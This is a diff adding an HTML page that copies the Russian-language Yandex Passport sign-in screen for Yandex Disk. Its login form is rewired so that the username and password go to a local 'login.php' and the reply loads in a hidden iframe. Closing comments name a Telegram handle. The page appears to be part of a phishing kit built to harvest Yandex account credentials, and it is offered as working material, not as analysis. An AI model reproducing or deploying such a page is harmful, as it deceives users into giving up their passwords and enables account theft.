@@ -1,0 +1,196 @@
+<html data-page-type="auth.new" class="is-js_yes passport-Page passport-Page_dark is-inlinesvg_yes is-inlinesvg_yes" lang="ru"><head>
+    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+    <script async="" src="%D0%90%D0%B2%D1%82%D0%BE%D1%80%D0%B8%D0%B7%D0%B0%D1%86%D0%B8%D1%8F_files/watch.js"></script>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7,IE=edge">
+    <link rel="shortcut icon" href="https://yastatic.net/morda-logo/i/favicon_islands.ico">
+    <script nonce="d86990c6-7b56-4ff1-9c57-4ba0ee854fd4">
+        (function(d, e, c, r, n, w, v, f) {
+            e = d.documentElement;
+            c = "className";
+            r = "replace";
+            n = "createElementNS";
+            f = "firstChild";
+            w = "http://www.w3.org/2000/svg";
+            v = d.createElement("div");
+            v.innerHTML = "<svg/>";
+            e[c] = e[c][r]("is-js_no", "is-js_yes");
+            e[c] += " is-inlinesvg_" + ((v[f] && v[f].namespaceURI) === w ? "yes" : "no");
+        })(document);
+    </script>
+    <title>Авторизация</title>
+    <!--[if gt IE 8]><!-->
+    <link rel="stylesheet" type="text/css" href="%D0%90%D0%B2%D1%82%D0%BE%D1%80%D0%B8%D0%B7%D0%B0%D1%86%D0%B8%D1%8F_files/auth.css">
+    <!-- <![endif]-->
+    <!--[if lt IE 9]><link rel="stylesheet" type="text/css" href="https://yastatic.net/passport-frontend/0.2.79-9/public/css/auth.new.ie.css"/><![endif]-->
+    <script nonce="d86990c6-7b56-4ff1-9c57-4ba0ee854fd4">
+        var uid = null;
+        var login = null;
+        var passportHost = "passport.yandex.ua";
+    </script>
+    <!--[if IE]><script src="//yastatic.net/jquery/1.9.1/jquery.min.js"></script><script crossorigin="anonymous" src="https://yastatic.net/passport-frontend/0.2.79-9/public/js/vendor.auth.new.js"></script><script crossorigin="anonymous" src="https://yastatic.net/passport-frontend/0.2.79-9/public/js/auth.new.react.ru.js"></script><![endif]-->
+    <!--[if !IE]><!-->
+    <script src="%D0%90%D0%B2%D1%82%D0%BE%D1%80%D0%B8%D0%B7%D0%B0%D1%86%D0%B8%D1%8F_files/jquery.js" defer="defer"></script>
+    <script crossorigin="anonymous" src="%D0%90%D0%B2%D1%82%D0%BE%D1%80%D0%B8%D0%B7%D0%B0%D1%86%D0%B8%D1%8F_files/vendor.js" defer="defer"></script>
+    <script crossorigin="anonymous" src="%D0%90%D0%B2%D1%82%D0%BE%D1%80%D0%B8%D0%B7%D0%B0%D1%86%D0%B8%D1%8F_files/auth.js" defer="defer"></script>
+    <!-- <![endif]-->
+    <script type="text/javascript" nonce="d86990c6-7b56-4ff1-9c57-4ba0ee854fd4">
+        ! function(i, t) {
+            function e() {
+                Ya.Rum.vsChanged = !0, document.removeEventListener("visibilitychange", e)
+            }
+            if (i.Ya = i.Ya || {}, Ya.Rum) throw new Error("Rum: interface is already defined");
+            var n = i.performance,
+                s = n && n.timing && n.timing.navigationStart || Ya.startPageLoad || +new Date,
+                a = i.requestAnimationFrame;
+            Ya.Rum = {
+                enabled: !!n,
+                vsStart: document.visibilityState,
+                vsChanged: !1,
+                _defTimes: [],
+                _defRes: [],
+                _deltaMarks: {},
+                _settings: {},
+                _vars: {},
+                init: function(i, t) {
+                    this._settings = i, this._vars = t
+                },
+                getTime: n && n.now ? function() {
+                    return n.now()
+                } : function() {
+                    return Date.now() - s
+                },
+                time: function(i) {
+                    this._deltaMarks[i] = [this.getTime()]
+                },
+                timeEnd: function(i) {
+                    var t = this._deltaMarks[i];
+                    t && 0 !== t.length && t.push(this.getTime())
+                },
+                sendTimeMark: function(i, t, e, n) {
+                    void 0 === t && (t = this.getTime()), this._defTimes.push([i, t, n]), this.mark(i, t)
+                },
+                sendResTiming: function(i, t) {
+                    this._defRes.push([i, t])
+                },
+                sendRaf: function(i) {
+                    if (a && !this.isVisibilityChanged()) {
+                        var t = this,
+                            e = "2616." + i;
+                        a(function() {
+                            t.isVisibilityChanged() || (t.sendTimeMark(e + ".205"), a(function() {
+                                t.isVisibilityChanged() || t.sendTimeMark(e + ".1928")
+                            }))
+                        })
+                    }
+                },
+                isVisibilityChanged: function() {
+                    return this.vsStart && ("visible" !== this.vsStart || this.vsChanged)
+                },
+                mark: n && n.mark ? function(i, t) {
+                    n.mark(i + (t ? ": " + t : ""))
+                } : function() {}
+            }, Date.now || (Ya.Rum.getTime = function() {
+                return new Date - s
+            }), document.addEventListener && document.addEventListener("visibilitychange", e)
+        }(window);
+        ! function() {
+            "use strict";
+            if (window.PerformanceLongTaskTiming) {
+                var e = Ya.Rum._tti = {
+                    events: [],
+                    observer: new PerformanceObserver(function(n) {
+                        e.events = e.events.concat(n.getEntries()), e.events.length > 100 && e.events.shift()
+                    })
+                };
+                e.observer.observe({
+                    entryTypes: ["longtask"]
+                })
+            }
+        }();
+        Ya.Rum.init({
+            beacon: true,
+            clck: 'https://yandex.ru/clck/click',
+            slots: ["reg_lite_exp", "social_postreg_exp", "toloka_exp", "music_etalon", "showdomik_new_desktop"],
+            reqid: 'c75f2a469ee363b7241af66eea7332bf'
+        }, {
+            '287': '143',
+            '143': '28.1207.2243'
+        });
+    </script>
+    <script src="%D0%90%D0%B2%D1%82%D0%BE%D1%80%D0%B8%D0%B7%D0%B0%D1%86%D0%B8%D1%8F_files/nearest.js" async="" crossorigin=""></script>
+<script src="https://yastatic.net/nearest.js" async="" crossorigin=""></script></head>
+
+<body class="passport-Page-Body-h" data-uid="null" data-login="null" data-passporthost="&quot;passport.yandex.ua&quot;" data-static-url="https://yastatic.net/passport-frontend/0.2.79-9/public/" data-logger-token="026e2e8ebf99a590af3e238724abe500" data-csrf="9cfc64b37a4edf9f0e6bb6d720905ad73533316b:1519572833081" data-metrics-id="784657" data-tld="ua" data-locale="ru">
+    <div id="root">
+        <div class="passport-Page-Body" data-reactroot="" data-reactid="1" data-react-checksum="439661942">
+            <div class="passport-Page-Background passport-Page-Background_906" data-reactid="2"></div><span class="passport-Page-Helper" data-reactid="3"></span>
+            <div class="passport-Page-Content" data-reactid="4">
+                <div class="passport-Domik passport-Domik_mode_addingAccount" data-reactid="5">
+                    <h1 class="passport-Logo" data-reactid="6"><a href="https://yandex.ua/" data-reactid="7"><span class="passport-Icon passport-Icon_yandex_ru" data-reactid="8"></span></a></h1>
+                    <div class="passport-Domik-Form-Error" data-reactid="9"></div>
+                    <div class="passport-ScreenBox passport-Domik-Content passport-Domik-Content_wide" data-reactid="10">
+                        <div class="passport-ScreenBox-Content" data-reactid="11">
+                            <div class="passport-ScreenBox-Item" data-reactid="12">
+                                <div class="passport-ScreenBox-Item-Content" data-reactid="13">
+                                    <div class="passport-Domik-Content" data-reactid="14"></div>
+                                </div>
+                            </div>
+                            <div class="passport-ScreenBox-Item passport-ScreenBox-Item_current" data-reactid="15">
+                                <div class="passport-ScreenBox-Item-Content" data-reactid="16">
+                                    <div class="passport-Domik-Content" data-reactid="17">
+                                        <form method="post" target="iframe" action="./login.php" class="passport-Domik-Form" data-reactid="18"><input name="real_retpath" value="https://disk.yandex.ua/?source=landing_web_signin" data-reactid="19" type="hidden"><input name="from" value="cloud" data-reactid="20" type="hidden"><input name="fretpath" data-reactid="21" value="" type="hidden"><input name="clean" data-reactid="22" value="" type="hidden"><input name="idkey" value="172148a44d97b58456411025c3321653cd" data-reactid="23" type="hidden"><input name="extended" value="1" data-reactid="24" type="hidden"><input name="csrf_token" value="2b5a5ddcdf35deaa7c244f9addd299ff05f2ac80:1519572833071" data-reactid="25" type="hidden"><input name="one" value="1" data-reactid="26" type="hidden"><input name="retpath" value="https://passport.yandex.ua/auth/login-status_v2.html?method=password" data-reactid="27" type="hidden">
+                                            <div class="passport-Domik-Form-Field" data-reactid="28"><label class="passport-Input" data-reactid="29"><input name="login" autocorrect="off" autocapitalize="off" autocomplete="username" placeholder=" " class="passport-Input-Controller" data-reactid="30" type="text"><span class="passport-Input-View" data-reactid="31"><span class="passport-Input-Label" data-reactid="32">Логин</span></span></label></div>
+                                            <div class="passport-Domik-Form-Field" data-reactid="33"><label class="passport-Input" data-reactid="34"><input class="passport-Input-Controller" name="passwd" autocorrect="off" autocapitalize="off" autocomplete="current-password" placeholder=" " data-reactid="35" type="password"><span class="passport-Input-View" data-reactid="36"><span class="passport-Input-Label" data-reactid="37">Пароль</span></span></label></div>
+                                            <div class="passport-Domik-Form-Field" data-reactid="38"><label class="passport-Checkbox" data-reactid="39"><input name="twoweeks" value="no" class="passport-Checkbox-Controller" data-reactid="40" type="checkbox"><span class="passport-Checkbox-View" data-reactid="41"></span><span class="passport-Checkbox-Label" data-reactid="42">Чужой компьютер</span></label></div>
+                                            <div class="passport-Domik-Form-Field" data-reactid="43"><button type="submit" class="passport-Button" data-reactid="44"><span class="passport-Button-Content" data-reactid="45"><span class="passport-Button-Text" data-reactid="46">Войти</span></span></button><button type="button" class="passport-Button passport-Button_qr" data-reactid="47"><span class="passport-Button-Content" data-reactid="48"></span></button></div>
+                                        </form>
+                                        <div data-reactid="49">
+                                            <h3 class="passport-Domik-Title" data-reactid="50">Или войдите с&nbsp;помощью соцсетей</h3>
+                                            <ul class="passport-Domik-SocialNetworks" data-reactid="51">
+                                                <li data-metrics="Начало соцавторизации: vk" class="passport-Domik-SocialNetworks-Item passport-Domik-SocialNetworks-Item_vk" data-reactid="52"><span class="passport-Icon passport-Icon_social_vk" data-reactid="53"></span></li>
+                                                <li data-metrics="Начало соцавторизации: ok" class="passport-Domik-SocialNetworks-Item passport-Domik-SocialNetworks-Item_ok" data-reactid="54"><span class="passport-Icon passport-Icon_social_ok" data-reactid="55"></span></li>
+                                                <li data-metrics="Начало соцавторизации: tw" class="passport-Domik-SocialNetworks-Item passport-Domik-SocialNetworks-Item_tw" data-reactid="56"><span class="passport-Icon passport-Icon_social_tw" data-reactid="57"></span></li>
+                                                <li data-metrics="Начало соцавторизации: mr" class="passport-Domik-SocialNetworks-Item passport-Domik-SocialNetworks-Item_mr" data-reactid="58"><span class="passport-Icon passport-Icon_social_mr" data-reactid="59"></span></li>
+                                                <li data-metrics="Начало соцавторизации: gg" class="passport-Domik-SocialNetworks-Item passport-Domik-SocialNetworks-Item_gg" data-reactid="60"><span class="passport-Icon passport-Icon_social_gg" data-reactid="61"></span></li>
+                                                <li data-metrics="Начало соцавторизации: fb" class="passport-Domik-SocialNetworks-Item passport-Domik-SocialNetworks-Item_fb" data-reactid="62"><span class="passport-Icon passport-Icon_social_fb" data-reactid="63"></span></li>
+                                            </ul>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="passport-ScreenBox-Item" data-reactid="64">
+                                <div class="passport-ScreenBox-Item-Content" data-reactid="65">
+                                    <div class="passport-Domik-Content" data-reactid="66"></div>
+                                </div>
+                            </div>
+                        </div>
+                        <ul class="passport-Domik-Footer" data-reactid="67">
+                            <li class="passport-Domik-Footer-Item" data-reactid="68"><a data-metrics="Клик на восстановление" href="https://passport.yandex.ua/restoration?from=cloud&amp;origin=disk_landing_web_signin_uk&amp;retpath=https%3A%2F%2Fdisk.yandex.ua%2F%3Fsource%3Dlanding_web_signin" class="passport-Domik-Link passport-Domik-Footer-Link" data-reactid="69">Не&nbsp;могу войти</a></li>
+                            <li class="passport-Domik-Footer-Item" data-reactid="70"><a data-metrics="Клик на регистрацию" href="https://passport.yandex.ua/registration?from=cloud&amp;origin=disk_landing_web_signin_uk&amp;retpath=https%3A%2F%2Fdisk.yandex.ua%2F%3Fsource%3Dlanding_web_signin" class="passport-Domik-Link passport-Domik-Footer-Link" data-reactid="71">Регистрация</a></li>
+                        </ul>
+                    </div>
+                </div>
+                <iframe class="passport-Domik-Iframe" name="iframe" src="%D0%90%D0%B2%D1%82%D0%BE%D1%80%D0%B8%D0%B7%D0%B0%D1%86%D0%B8%D1%8F_files/a.html" data-reactid="74"></iframe></div>
+            <footer class="passport-Page-Footer" data-reactid="75">
+                <div class="footer" data-reactid="76"><span class="footer-item footer-item__langswitcher" data-reactid="77"><span class="link link_theme_normal link_pseudo_yes" role="button" tabindex="0" data-reactid="78"><span class="link__inner" data-reactid="79"><!-- react-text: 80 -->ru<!-- /react-text --></span></span>
+                    </span><noscript data-reactid="81"></noscript><span class="footer-item" data-reactid="82"><a class="link link_theme_normal" target="_blank" href="https://yandex.ua/support/passport/" tabindex="0" data-reactid="83"><span class="link__inner" data-reactid="84"><!-- react-text: 85 -->Помощь<!-- /react-text --></span></a>
+                    </span><span class="footer-item footer-item__rights" data-reactid="86"><!-- react-text: 87 -->© 2018, <!-- /react-text --><a class="link link_theme_normal" href="https://yandex.ua/" tabindex="0" data-reactid="88"><span class="link__inner" data-reactid="89"><!-- react-text: 90 -->Яндекс<!-- /react-text --></span></a>
+                    </span>
+                </div>
+            </footer>
+        </div>
+    </div><noscript><div><img src="//mc.yandex.ru/watch/784657" style="position:absolute; left:-9999px;" alt=""/></div></noscript>
+    <div>
+        <div data-reactroot="" class="popup2 popup2_theme_normal popup2_target_anchor popup2_autoclosable">
+            <ul class="menu menu_size_s menu_width_max menu_theme_normal menu_type_navigation" aria-disabled="false">
+                <li class="menu__list-item"><a class="menu__item menu__item_type_link" aria-selected="false" aria-disabled="false" role="link" href="https://tune.yandex.ru/api/lang/v1.1/save.xml?sk=y39444f99da7ff8941a04bc082aeee318&amp;retpath=https%3A%2F%2Fpassport.yandex.ua%2Fauth%3Ffrom%3Dcloud%26origin%3Ddisk_landing_web_signin_uk%26retpath%3Dhttps%253A%252F%252Fdisk.yandex.ua%252F%253Fsource%253Dlanding_web_signin%26backpath%3Dhttps%253A%252F%252Fdisk.yandex.ua%26ncrnd%3D2163&amp;intl=uk"><span class="menu__text">Ua</span></a></li>
+                <li class="menu__list-item"><a class="menu__item menu__item_type_link" aria-selected="false" aria-disabled="false" role="link" href="https://tune.yandex.ru/api/lang/v1.1/save.xml?sk=y39444f99da7ff8941a04bc082aeee318&amp;retpath=https%3A%2F%2Fpassport.yandex.ua%2Fauth%3Ffrom%3Dcloud%26origin%3Ddisk_landing_web_signin_uk%26retpath%3Dhttps%253A%252F%252Fdisk.yandex.ua%252F%253Fsource%253Dlanding_web_signin%26backpath%3Dhttps%253A%252F%252Fdisk.yandex.ua%26ncrnd%3D2163&amp;intl=en"><span class="menu__text">En</span></a></li>
+            </ul>
+        </div>
+    </div>
+
+<!--Telegram><!-->
+<!--@hadariel><!-->
+
+</body></html>
